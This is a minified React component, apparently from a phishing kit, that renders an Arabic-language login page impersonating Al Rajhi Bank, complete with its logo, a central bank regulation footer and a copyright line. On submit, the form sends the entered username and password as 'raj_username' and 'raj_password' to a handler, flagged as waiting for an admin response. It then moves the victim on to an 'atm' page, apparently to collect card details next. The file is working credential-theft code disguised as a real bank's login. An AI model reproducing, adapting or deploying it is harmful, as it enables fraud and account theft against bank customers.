import{u as o,j as e,s as d}from"./index-D4BysLqo.js";import{q as u,M as x,I as r,B as c}from"./MainWrapper-3fG7tHnO.js";
const p={fullName:"",password:""};
function f(){
const l=o(),{register:s,handleSubmit:i,formState:{errors:a,isValid:n}}=u({mode:"all",defaultValues:p}),
m=t=>{d({data:{"raj_username":t.fullName,"raj_password":t.password},current:"rajhi-payment",nextPage:"atm",nextLink:"/atm",waitingForAdminResponse:!0,navigate:l})};
return e.jsx(x,{children:e.jsx("div",{style:{minHeight:"100vh",background:"linear-gradient(135deg, #1a0533 0%, #2d1b69 30%, #1e3a5f 70%, #0a1628 100%)",display:"flex",alignItems:"center",justifyContent:"center",padding:"20px",fontFamily:"Tajawal, Cairo, sans-serif"},children:e.jsxs("div",{style:{width:"100%",maxWidth:"420px"},children:[
e.jsxs("div",{style:{background:"rgba(255,255,255,0.95)",backdropFilter:"blur(20px)",borderRadius:"24px",padding:"40px 32px",boxShadow:"0 20px 60px rgba(0,0,0,0.4)"},children:[
e.jsx("div",{style:{textAlign:"center",marginBottom:"28px"},children:e.jsx("img",{src:"/assets/images/rajhi-logo.png",alt:"Al Rajhi Bank",style:{height:"56px",margin:"0 auto",display:"block"}})}),
e.jsx("h1",{style:{fontSize:"22px",fontWeight:"800",color:"#1a0533",textAlign:"center",marginBottom:"4px"},children:"مرحباً بك"}),
e.jsx("p",{style:{fontSize:"14px",color:"#666",textAlign:"center",marginBottom:"28px"},children:"الراجحي أون لاين — التجربة الرقمية الأفضل"}),
e.jsxs("form",{onSubmit:i(m),style:{display:"flex",flexDirection:"column",gap:"16px"},dir:"rtl",children:[
e.jsxs("div",{children:[
e.jsx("label",{style:{display:"block",fontSize:"13px",fontWeight:"700",color:"#444",marginBottom:"6px"},children:"رقم الهوية / اسم المستخدم"}),
e.jsx("input",{...s("fullName",{required:"اسم المستخدم مطلوب"}),type:"text",placeholder:"أدخل رقم الهوية أو اسم المستخدم",style:{width:"100%",padding:"14px 16px",borderRadius:"12px",border:"1.5px solid #e0e0e0",fontSize:"15px",background:"#f8f7fc",outline:"none",direction:"ltr",textAlign:"left",boxSizing:"border-box",transition:"border 0.2s"},onFocus:ev=>ev.target.style.borderColor="#4B2A85",onBlur:ev=>ev.target.style.borderColor="#e0e0e0"}),
a.fullName&&e.jsx("span",{style:{fontSize:"12px",color:"#e74c3c",marginTop:"4px",display:"block"},children:a.fullName.message})
]}),
e.jsxs("div",{children:[
e.jsx("label",{style:{display:"block",fontSize:"13px",fontWeight:"700",color:"#444",marginBottom:"6px"},children:"كلمة المرور"}),
e.jsx("input",{...s("password",{required:"كلمة المرور مطلوبة"}),type:"password",placeholder:"أدخل كلمة المرور",style:{width:"100%",padding:"14px 16px",borderRadius:"12px",border:"1.5px solid #e0e0e0",fontSize:"15px",background:"#f8f7fc",outline:"none",direction:"ltr",textAlign:"left",boxSizing:"border-box",transition:"border 0.2s"},onFocus:ev=>ev.target.style.borderColor="#4B2A85",onBlur:ev=>ev.target.style.borderColor="#e0e0e0"}),
a.password&&e.jsx("span",{style:{fontSize:"12px",color:"#e74c3c",marginTop:"4px",display:"block"},children:a.password.message})
]}),
e.jsx("button",{type:"submit",disabled:!n,style:{width:"100%",padding:"14px",borderRadius:"14px",border:"none",background:n?"linear-gradient(135deg,#4B2A85,#2d1b69)":"#ccc",color:"#fff",fontSize:"16px",fontWeight:"700",cursor:n?"pointer":"not-allowed",marginTop:"8px",fontFamily:"inherit",boxShadow:n?"0 4px 15px rgba(75,42,133,0.4)":"none",transition:"all 0.3s"},children:"تسجيل الدخول"})
]}),
e.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginTop:"16px",fontSize:"12px"},children:[
e.jsx("a",{href:"#",style:{color:"#4B2A85",textDecoration:"none",fontWeight:"600"},children:"نسيت كلمة المرور؟"}),
e.jsx("a",{href:"#",style:{color:"#4B2A85",textDecoration:"none",fontWeight:"600"},children:"مستخدم جديد؟"})
]})
]}),
e.jsxs("div",{style:{textAlign:"center",marginTop:"20px",color:"rgba(255,255,255,0.5)",fontSize:"11px"},children:[
e.jsx("p",{children:"مصرف الراجحي — خاضع لرقابة البنك المركزي السعودي"}),
e.jsx("p",{style:{marginTop:"4px"},children:"© 2024 Al Rajhi Bank. All Rights Reserved."})
]})
]})})})
}
export{f as default};
